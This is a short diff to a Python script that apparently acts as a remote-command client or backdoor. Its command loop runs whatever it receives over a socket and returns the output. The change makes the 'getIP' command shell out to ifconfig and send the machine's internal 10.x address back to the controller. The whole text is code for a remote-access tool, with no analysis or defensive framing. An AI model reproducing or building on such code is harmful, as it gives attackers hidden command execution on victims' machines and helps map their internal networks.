@@ -1,7 +1,7 @@
 import socket, subprocess, os, sys, random
 from threading import Thread
 from time import sleep
-import random
+import random, re
 
 
 #######
@@ -223,7 +223,10 @@ def clientLoop():
                 s.close()
                 break
             elif "getIP" in command:
-                IP = socket.gethostbyname(socket.gethostname())
+                regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})')
+                IP = subprocess.run("ifconfig | grep inet", shell=True,stdout=subprocess.PIPE)
+                IP = str(IP)
+                IP = regex.search(IP)[0]
                 s.send(str(IP).encode())
             else: #if the user doesn't want to perform a special action, run the command and capture the output
                 #if the command runs for longer than 5 seconds, timeout
